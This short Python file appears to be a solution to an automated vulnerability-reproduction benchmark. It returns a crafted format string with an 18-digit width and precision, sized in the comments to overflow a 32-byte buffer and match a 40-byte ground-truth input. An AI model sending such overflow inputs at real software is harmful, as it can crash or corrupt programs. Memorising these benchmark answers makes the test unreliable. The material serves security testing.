import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct format string with width and precision that will exceed buffer
        # Using 19-digit width and 19-digit precision plus specifier gives >32 chars
        # Total length: 1(%) + 19(width) + 1(.) + 19(precision) + 1(specifier) = 41
        # Ground truth is 40 bytes, so we use 18-digit width and 18-digit precision
        # 1(%) + 18(width) + 1(.) + 18(precision) + 1(d) = 39 bytes + null = 40
        return b"%999999999999999999.999999999999999999d"